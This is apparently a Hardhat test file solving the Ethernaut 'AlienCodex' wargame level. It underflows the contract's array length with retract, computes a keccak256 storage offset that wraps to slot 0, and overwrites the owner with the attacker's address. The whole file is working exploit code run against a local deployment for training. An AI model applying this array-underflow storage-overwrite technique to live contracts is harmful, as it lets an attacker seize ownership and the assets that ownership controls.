import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { BigNumber, Contract } from 'ethers';
import { ethers } from 'hardhat';

const { utils } = ethers;

describe('AlienCodex', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  let contract: Contract;
  before(async () => {
    [owner, attacker] = await ethers.getSigners();

    const Factory = await ethers.getContractFactory('AlienCodex');
    contract = await Factory.connect(owner).deploy();
    await contract.deployed();
  });

  it('attack', async () => {
    let tx = await contract.connect(attacker).make_contact();
    await tx.wait();

    tx = await contract.retract();
    await tx.wait();

    const inBytes = utils.hexZeroPad(attacker.address, 32);

    const mapZeroDirection = `0x0000000000000000000000000000000000000000000000000000000000000001`;
    const mapDataBegin = BigNumber.from(utils.keccak256(mapZeroDirection));

    const isCompleteOffset = BigNumber.from(`2`).pow(`256`).sub(mapDataBegin);

    tx = await contract.revise(isCompleteOffset, inBytes);
    await tx.wait();

    expect(await contract.owner()).to.equal(attacker.address);
  });
});
